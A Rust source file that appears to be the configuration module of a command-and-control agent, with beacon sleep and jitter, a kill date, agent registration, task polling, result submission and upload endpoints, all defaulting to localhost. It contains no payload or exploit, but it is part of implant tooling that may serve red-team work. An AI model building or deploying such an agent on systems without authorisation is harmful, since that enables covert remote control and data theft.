use serde::{Deserialize, Serialize};
use std::fs;
use std::io;
use uuid::Uuid;

#[derive(Serialize, Deserialize, Clone)]
pub struct AgentConfig {
    pub server_url: String,
    pub sleep_interval: u64,
    pub jitter: u64,
    pub kill_date: Option<String>,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            server_url: String::from("0.0.0.0:8080"),  // Remove http:// from default
            sleep_interval: 5,
            jitter: 2,
            kill_date: None,
        }
    }
}

impl AgentConfig {
    pub fn load() -> io::Result<Self> {
        match fs::read_to_string("config.json") {
            Ok(contents) => Ok(serde_json::from_str(&contents)?),
            Err(_) => Ok(Self::default())
        }
    }

    pub fn get_server_url(&self) -> String {
        if self.server_url.starts_with("http://") {
            self.server_url.clone()
        } else {
            format!("http://{}", self.server_url)
        }
    }
}

pub struct ServerConfig {
    pub server_url: String,
    pub sleep_time: u64,
    pub jitter: u64,
    pub uuid: String,
    pub registered: bool,
    pub agent_type: String,
    pub system_info: String,
    pub hostname: String,
    pub upload_dir: String,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            server_url: String::from("http://localhost:8080"),
            sleep_time: 5,
            jitter: 2,
            uuid: Uuid::new_v4().to_string(),
            registered: false,
            agent_type: String::from("rust"),
            system_info: String::new(),
            hostname: String::new(),
            upload_dir: String::from("uploads"),
        }
    }
}

impl ServerConfig {
    pub fn new() -> Self {
        Default::default()
    }

    pub fn register_url(&self) -> String {
        format!("{}/api/agent/register", self.server_url)
    }

    pub fn get_task_url(&self) -> String {
        format!("{}/api/agent/{}/task", self.server_url, self.uuid)
    }

    pub fn submit_result_url(&self) -> String {
        format!("{}/api/agent/{}/result", self.server_url, self.uuid)
    }

    pub fn upload_path(&self) -> String {
        format!("{}/api/agent/{}/upload", self.server_url, self.uuid)
    }
}
